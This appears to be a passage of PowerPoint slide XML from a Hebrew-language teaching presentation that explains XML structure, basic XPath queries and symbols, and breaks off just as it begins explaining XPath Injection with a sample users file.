            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא שיטה בה תוקף מנצל חולשות בקוד של שאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להשיג מידע שהוא לא אמור לגשת אליו או לבצע פעולות לא רצויות על הנתונים - בהמשך נראה דוגמאות לדבר. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="354230619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B229EF-7419-4FC4-9606-24FE0CD183AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7126357" y="642594"/>
            <a:ext cx="3998842" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF5FD479-1617-4109-AD57-55CE6E292568}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (XML Path Language)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא שפת חיפוש ומניפולציה המיועדת לעבוד עם מסמכים במבנה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאפשרת לנו לאתר, לחלץ, ולבצע פעולות על חלקים שונים של מסמך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בצורה גמישה ויעילה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מבנה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לפני שנצלול לעומק </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נבין מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>eXtensible</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Markup Language)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא שפת תיאור נתונים שמשמשת לארגון ולייצוג מידע בצורה היררכית באמצעות תגיות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>tags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="357476513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30411FE-3FD7-4D59-855E-697FFB4E4D7A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7265504" y="129209"/>
            <a:ext cx="3859696" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מבנה של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1473D31-9F68-4A62-B39E-721C0B97461F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1371600"/>
            <a:ext cx="10058400" cy="5257800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מסמך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בנוי כעץ שבו כל תגית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> element</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יכולה להכיל תגיות נוספות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>sub-elements </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ו תוכן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>text</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לדוגמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;library&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;book&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;title&gt;Introduction to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/title&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;author&gt;John Doe&lt;/author&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;year&gt;2024&lt;/year&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;/book&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;book&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;title&gt;Advanced XML Techniques&lt;/title&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;author&gt;Jane Smith&lt;/author&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;year&gt;2023&lt;/year&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;/book&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/library&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במסמך זה, ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מייצג ספרייה שמכילה שני ספרים.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="310129670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B4D1EE2-775B-462C-AD9A-B31E10D7B574}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5874026" y="125759"/>
            <a:ext cx="5251174" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פועלת?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{447F8FEC-B6E5-4324-B5F7-86ED2CE66043}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1367623"/>
            <a:ext cx="10058400" cy="5222020"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאפשרת לחפש נתונים ולבצע מניפולציות עליהם תוך שימוש בנתיב </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמצביע על המיקום של הנתונים בתוך המסמך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>דוגמאות ליכולות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בחירת אלמנטים לפי נתיב:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לבחור את כל הספרים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/library/book</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לבחור את שם הספר של כל הספרים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/library/book/title</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>חיפוש לפי תכנים:</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>למצוא את שם הספר של ספר שפורסם בשנת 2024:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/library/book[year='2024']/title</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>book[year='2024']</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> סינון את הספרים לפי השנה, ולאחר מכן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/title</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מחלץ את שם הספר של ספרים שעמדו בתנאים.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26515407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AE93803-B33C-4FDD-AE07-FEF83A57B3A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3826564" y="642594"/>
            <a:ext cx="7298635" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - כיצד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פועלת?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B1E2E9A-D451-4D24-949E-5B438BFF9E65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2800" b="1" u="sng" dirty="0"/>
              <a:t>המשך דוגמאות ליכולות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2800" b="1" u="sng" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בפונקציות:</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>למצוא את שם הספר הראשון:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/library/book[1]/title</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>[1]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מספק את הספר הראשון ברשימה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש באופרטורים:</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>למצוא ספרים ששם המחבר שלהם הוא "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> "John Doe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"Jane Smith:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/library/book[author='John Doe' or author='Jane Smith']</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>or</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאפשר לבחור ספרים שמתאימים לפחות אחד מהתנאים.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="609798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12199E-B192-46F1-AC41-492BBC92817D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3289852" y="642594"/>
            <a:ext cx="7835348" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפונקציות והסימונים ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A7B00673-7E0C-4047-BA2A-A769EB19044C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מסמן את השורש של המסמך או את תחילת הנתיב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מסמן חיפוש בכל מקום בעץ.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>@: משמש לגישה למאפיינים של תגיות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>attributes</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>[ ]: מספק תנאים לסינון.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לסיכום, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא שפה חזקה וגמישה לחיפוש ולמניפולציה של נתונים במבני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא מאפשרת לנו לבחור, לסנן ולהשיג את המידע הרצוי מתוך המסמך בצורה מדויקת ויעילה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="262891752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1633B91-2AD1-4CDD-BC29-DAA0254A863D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3916017" y="274846"/>
            <a:ext cx="7209183" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך עובד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XPath Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AABD6A70-2CC5-4B92-A655-00D2C4CF2AE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1825350"/>
            <a:ext cx="10058400" cy="5032650"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בדרך כלל, יישומים מבצעים שאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לחפש נתונים במסמכי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. לדוגמה, נניח שיש לנו מסמך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמכיל רשימת משתמשים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;users&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;user id="1"&gt;</a:t>
